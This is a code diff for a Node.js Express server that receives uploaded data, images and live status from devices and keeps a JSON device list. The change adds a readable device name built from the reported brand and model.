@@ -40,7 +40,7 @@ app.post('/upload.php', (req, res) => {
             }
             
             fs.writeFileSync(imagesFile, JSON.stringify(imagesData, null, 2));
-            updateDevicesList(deviceId);
+            updateDevicesList(deviceId, null);
             return res.json({ success: true, images_count: imagesData.length });
         }
         
@@ -66,7 +66,10 @@ app.post('/upload.php', (req, res) => {
         }
         
         fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));
-        updateDevicesList(deviceId);
+        
+        const deviceInfo = data.data && data.data.device_info ? data.data.device_info : null;
+        updateDevicesList(deviceId, deviceInfo);
+        
         res.json({ success: true });
     } catch (e) {
         res.json({ error: e.message });
@@ -90,7 +93,7 @@ app.post('/live_update.php', (req, res) => {
         live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
         
         fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
-        updateDevicesList(deviceId);
+        updateDevicesList(deviceId, null);
         res.json({ success: true });
     } catch (e) {
         res.json({ error: e.message });
@@ -204,12 +207,24 @@ app.get('/devices.json', (req, res) => {
     }
 });
 
-function updateDevicesList(deviceId) {
+function updateDevicesList(deviceId, deviceInfo) {
     let devices = [];
     if (fs.existsSync(devicesFile)) devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
+    
     const index = devices.findIndex(d => d.id === deviceId);
-    if (index >= 0) devices[index].last_seen = Math.floor(Date.now()/1000);
-    else devices.push({ id: deviceId, first_seen: Math.floor(Date.now()/1000), last_seen: Math.floor(Date.now()/1000) });
+    if (index >= 0) {
+        devices[index].last_seen = Math.floor(Date.now()/1000);
+        if (deviceInfo && deviceInfo.model) {
+            devices[index].name = `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim();
+        }
+    } else {
+        devices.push({
+            id: deviceId,
+            name: deviceInfo && deviceInfo.model ? `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim() : deviceId,
+            first_seen: Math.floor(Date.now()/1000),
+            last_seen: Math.floor(Date.now()/1000)
+        });
+    }
     fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 }
 
